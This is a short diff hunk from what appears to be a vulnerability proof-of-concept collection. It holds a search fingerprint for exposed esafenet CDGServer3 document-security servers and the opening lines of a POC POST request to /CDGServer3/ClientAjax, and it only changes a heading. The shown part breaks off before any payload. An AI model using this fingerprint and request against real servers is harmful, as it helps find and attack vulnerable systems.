@@ -8,7 +8,7 @@
 body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"||body="/CDGServer3/index.jsp"
 ```
 
-## poc
+## POC
 ```
 POST /CDGServer3/ClientAjax HTTP/1.1
 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
